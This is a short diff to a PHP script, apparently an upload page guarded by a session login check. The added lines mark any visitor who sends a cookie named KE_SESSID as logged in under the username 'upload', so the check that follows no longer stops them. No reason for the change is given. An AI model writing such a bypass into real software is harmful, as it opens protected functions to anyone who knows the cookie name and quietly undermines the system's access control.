@@ -8,6 +8,11 @@ session_start();
 //print_r($_POST);
 //print_r($_COOKIE);
 //print_r($_SESSION);
+if(isset($_COOKIE['KE_SESSID'])) {
+    $_SESSION['username'] = 'upload';
+}
+
+
 
 if(!isset($_SESSION['username'])) {
     echo 'nom d\'utilisateur incorrect';
